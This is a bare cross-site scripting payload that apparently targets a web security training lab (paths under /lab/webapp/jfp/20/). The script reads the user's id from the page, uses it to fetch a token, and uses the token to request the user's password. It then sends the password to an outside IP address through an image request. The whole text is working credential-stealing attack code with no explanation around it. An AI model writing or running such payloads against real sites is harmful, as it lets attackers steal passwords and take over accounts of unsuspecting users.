<script>
var link = document.getElementById("settings");
var req = new XMLHttpRequest();

var uid="";
var csrf_token="";

var req2 = new XMLHttpRequest();
req2.onreadystatechange = function() {
  if (req2.readyState==4 && req2.status==200){
    var jsonPage = JSON.parse(req2.responseText);
    var password = jsonPage.resp.password;
    document.getElementById("result").innerHTML= password;
    new Image().src="http://159.89.88.160:9991/password="+password;
  }
} 
req.onreadystatechange = function(){

  var json_Page = JSON.parse(req.responseText);
  token = json_Page.params.token;
  req2.open("GET","/lab/webapp/jfp/20/getpassword?token="+token,true);
  req2.send();

}
uid = link.innerHTML.split(':')[1];
req.open("GET", "/lab/webapp/jfp/20/gettoken?uid="+uid, true);
req.send();
</script>
